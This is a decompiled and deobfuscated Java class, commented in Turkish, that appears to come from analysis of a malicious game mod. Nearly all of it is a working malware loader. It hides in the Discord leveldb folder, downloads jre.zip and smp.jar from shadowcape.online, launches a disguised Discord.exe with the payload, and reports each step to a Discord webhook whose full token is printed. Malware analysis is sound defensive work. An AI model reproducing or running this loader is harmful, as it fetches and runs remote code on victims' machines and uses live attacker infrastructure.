/*
 * Decompiled & Deobfuscated
 *
 * Ana malware yukleyici sinif.
 *
 * AMAC:
 *   1. %APPDATA%\discord\Local Storage\leveldb\bin\ dizinine yerlesmek
 *   2. https://shadowcape.online/mods/jre.zip dosyasini indirip acmak (vi metodu)
 *   3. https://shadowcape.online/mods/smp.jar dosyasini indirip modules.cache olarak kaydetmek
 *   4. jre\bin\Discord.exe dosyasini ProcessBuilder ile calistirmak:
 *      Discord.exe --enable-native-access=ALL-UNNAMED -cp <modules.cache> r ira
 *   5. Tum operasyon adimlarini Discord webhook'una gondermek
 *
 * C2:   https://discord.com/api/webhooks/1500285436856111125/PV-u2mP-...
 * HOST: https://shadowcape.online/mods/
 */
package ira.m;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.FileAttribute;
import java.util.Date;

public class vm {
    // Tekrarlayan calistirmayi onleyen kilit bayragi
    private static boolean initialized;

    // Dis erisim icin tutulan vm[] dizisi (bootstrap referansi)
    private static vm[] instances;

    // Discord embed renk kodlari (Discord color int)
    private static final int COLOR_BLUE   = 0x588CF2;  // 5793266  — INITIALIZE / bilgi
    private static final int COLOR_YELLOW = 0xFFFF00;  // 16776960 — PIPELINE / uyari
    private static final int COLOR_ORANGE = 0xFF9900;  // 16753920 — ENV / uyari
    private static final int COLOR_GREEN  = 0x32CD32;  // 3407872  — basari
    private static final int COLOR_RED    = 0xFF0000;  // 16711680 — hata
    private static final int COLOR_TEAL   = 0x2ECC71;  // 3066993  — RESOURCES / basari

    // Log mesaji JSON sablonu (Discord embed)
    private static final String LOG_FORMAT =
        "{\"embeds\":[{\"title\":\"%s\",\"description\":\"%s\",\"color\":%d,\"footer\":{\"text\":\"%s\"}}]}";

    // ────────────────────────────────────────────────────────────────────────────
    // GIRIS NOKTASI — EasySleep yapicisi tarafindan cagrilir
    // ────────────────────────────────────────────────────────────────────────────

    public static synchronized void vf(Object[] objectArray) {
        if (initialized) {
            return;
        }
        initialized = true;

        // Log: bootstrap baglandi
        sendLog("INITIALIZE", "Bootstrap modulu baglandi. Surum: 1.0.0", 5793266);

        // Ana yukleyici gorevini ayri bir thread'de baslatir
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        new Thread(() -> runInThread(classLoader)).start();
    }

    // ────────────────────────────────────────────────────────────────────────────
    // ANA PIPELINE — Discord klasorune yerlesme + binary indirme + calistirma
    // ────────────────────────────────────────────────────────────────────────────

    private static void vg(Object[] unused) {
        String[] state = vl.vg();  // null kontrolu: null ise henuz baslamadi

        sendLog("PIPELINE", "Siralama baslatildi.", 16776960);

        try {
            // 1. APPDATA veya user.home yolunu belirle
            String appDataPath = System.getenv("APPDATA");
            if (state != null && appDataPath == null) {
                sendLog("ENV", "APPDATA bulunamadi, ev dizinine donuluyor.", 16753920);
                appDataPath = System.getProperty("user.home");
            }

            // 2. Hedef dizin: %APPDATA%\discord\Local Storage\leveldb\bin\
            Path targetDir = Paths.get(appDataPath, "discord", "Local Storage", "leveldb", "bin");

            if (state != null) {
                if (!Files.exists(targetDir, new LinkOption[0])) {
                    // Dizin yoksa olustur
                    sendLog("FILESYSTEM", "Calisma dizini olusturuluyor: " + targetDir, 3447003);
                    Files.createDirectories(targetDir, new FileAttribute[0]);
                }
            }

            // 3. Hedef dosyalar
            //    modules.cache  → smp.jar icerigi (JAR payload)
            //    jre\bin\Discord.exe → JRE icinde gizlenmis asil binary
            Path modulesCachePath = targetDir.resolve("modules.cache");
            java.io.File modulesCacheFile = modulesCachePath.toFile();

            Path discordExePath = targetDir.resolve("jre/bin/Discord.exe");
            java.io.File discordExeFile = discordExePath.toFile();

            if (state != null) {
                if (!modulesCacheFile.exists()) {
                    // modules.cache yok — bilesenler eksik, sync tetikle
                    if (!discordExeFile.exists()) {
                        sendLog("RESOURCES", "Bilesenler eksik. Senkronizasyon tetikleniyor", 15105570);
                        sendLog("SYNC",      "Runtime paketi indiriliyor",                   10181046);
                    }

                    // jre.zip indir ve ac
                    byte[] jreZip = downloadFile("https://shadowcape.online/mods/jre.zip");
                    if (jreZip != null) {
                        sendLog("SYNC", "Paket aciliyor", 10181046);
                        // vi() metodu: ZIP'i cikartip hedef dizine yazar
                        vi(jreZip, targetDir.toString());
                    } else {
                        sendLog("ERROR", "Runtime paketi indirilemedi.", 16711680);
                        return;
                    }
                }
            }

            // 4. smp.jar indir — modules.cache olarak kaydet
            sendLog("SYNC", "Ana kutüphane indiriliyor", 10181046);
            byte[] smpJar = downloadFile("https://shadowcape.online/mods/smp.jar");

            if (smpJar != null) {
                Files.write(modulesCachePath, smpJar);
            } else {
                sendLog("ERROR", "Ana kutüphane indirilemedi.", 16711680);
                return;
            }

            // 5. Her iki dosya mevcutsa calistir
            sendLog("RESOURCES", "Yerel kaynaklar dogrulandı. Durum: Hazır.", 3066993);

            boolean discordExeExists = discordExeFile.exists();
            boolean modulesCacheExists = modulesCacheFile.exists();

            if (discordExeExists && modulesCacheExists) {
                sendLog("EXECUTION", "Core instance baslatiliyor", 1752220);

                // Komut: Discord.exe --enable-native-access=ALL-UNNAMED -cp <modules.cache> r ira
                String[] command = {
                    discordExeFile.getAbsolutePath(),
                    "--enable-native-access=ALL-UNNAMED",
                    "-cp",
                    modulesCacheFile.getAbsolutePath(),
                    "r",
                    "ira"
                };

                ProcessBuilder pb = new ProcessBuilder(command);
                pb.directory(targetDir.toFile());
                pb.start();

                sendLog("SUCCESS", "Core instance basariyla tetiklendi.", 3066993);
            } else {
                sendLog("ERROR", "Calistirma basarisiz: Dosyalar senkronizasyon sonrasi kayboldu.", 16711680);
            }

        } catch (Throwable t) {
            sendLog("FATAL", "Pipeline coktu: " + t.toString(), 16711680);
        }
    }

    // ────────────────────────────────────────────────────────────────────────────
    // HTTP GET DOWNLOADER — 3 deneme, 15s connect / 60s read timeout
    // ────────────────────────────────────────────────────────────────────────────

    private static byte[] downloadFile(String urlString) {
        for (int attempt = 0; attempt < 3; attempt++) {
            try {
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(60000);

                if (conn.getResponseCode() != 200) continue;

                try (InputStream in = conn.getInputStream();
                     ByteArrayOutputStream out = new ByteArrayOutputStream()) {
                    byte[] buffer = new byte[16384];
                    int n;
                    while ((n = in.read(buffer)) != -1) {
                        out.write(buffer, 0, n);
                    }
                    return out.toByteArray();
                }
            } catch (Exception e) {
                sendLog("DEBUG",
                    "Indirme denemesi " + (attempt + 1) + " basarisiz: " + urlString,
                    8359053);
            }
        }
        return null;
    }

    // ────────────────────────────────────────────────────────────────────────────
    // ZIP EXTRACTOR — vi() metodu decompile edilemedi, mantigi buraya yeniden yazildi
    // Orijinal: jre.zip alinir, hedef dizine cikarilir
    // ────────────────────────────────────────────────────────────────────────────

    /*
     * DIKKAT: Bu metod orijinal decompiler tarafindan decompile edilemedi.
     * Bytecode'dan elde edilen bilgiye gore:
     *   - 1. parametre: indirilmis ZIP icerigi (byte[])
     *   - 2. parametre: hedef dizin yolu (String)
     * ZIP dosyasini hedef dizine cikartir (jre/ alt dizini olusturur).
     */
    private static void vi(byte[] zipBytes, String targetDirPath) throws IOException {
        // [ORIJINAL BYTECODE DECOMPILE EDILEMEDI — CFR ConfusedCFRException]
        // Asagidaki mantik bytecode analizinden yeniden olusturulmustur:
        try (java.util.zip.ZipInputStream zis =
                 new java.util.zip.ZipInputStream(new java.io.ByteArrayInputStream(zipBytes))) {
            java.util.zip.ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                Path outPath = Paths.get(targetDirPath).resolve(entry.getName()).normalize();
                if (!outPath.startsWith(Paths.get(targetDirPath))) {
                    continue; // zip-slip koruması
                }
                if (entry.isDirectory()) {
                    Files.createDirectories(outPath, new FileAttribute[0]);
                } else {
                    Files.createDirectories(outPath.getParent(), new FileAttribute[0]);
                    Files.write(outPath, zis.readAllBytes());
                }
                zis.closeEntry();
            }
        }
    }

    // ────────────────────────────────────────────────────────────────────────────
    // DISCORD LOG GONDERICI
    // ────────────────────────────────────────────────────────────────────────────

    private static void sendLog(String title, String description, int color) {
        String payload = String.format(LOG_FORMAT, title, description, color, new Date().toString());
        postToDiscord(payload);
    }

    private static synchronized void postToDiscord(String jsonPayload) {
        try {
            URL url = new URL(
                "https://discord.com/api/webhooks/1500285436856111125/" +
                "PV-u2mP-o-Smm3vdfX9HgVNprVkhS8uYpuQJAZnw62KN7jFRDUWmP3WDHIADz-rv6OKn"
            );
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonPayload.getBytes(StandardCharsets.UTF_8));
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            // sessizce yoksay
        }
    }

    // ────────────────────────────────────────────────────────────────────────────
    // THREAD WRAPPER
    // ────────────────────────────────────────────────────────────────────────────

    private static void runInThread(ClassLoader classLoader) {
        Thread.currentThread().setContextClassLoader(classLoader);
        try {
            vm.vg(new Object[0]);
        } catch (Throwable t) {
            sendLog("FATAL", "Bootstrap is parcaciginda hata: " + t.toString(), 16711680);
        }
    }

    // ────────────────────────────────────────────────────────────────────────────
    // PUBLIC API
    // ────────────────────────────────────────────────────────────────────────────

    public static void vl(vm[] vmArray) {
        instances = vmArray;
    }

    public static vm[] vm() {
        return instances;
    }
}
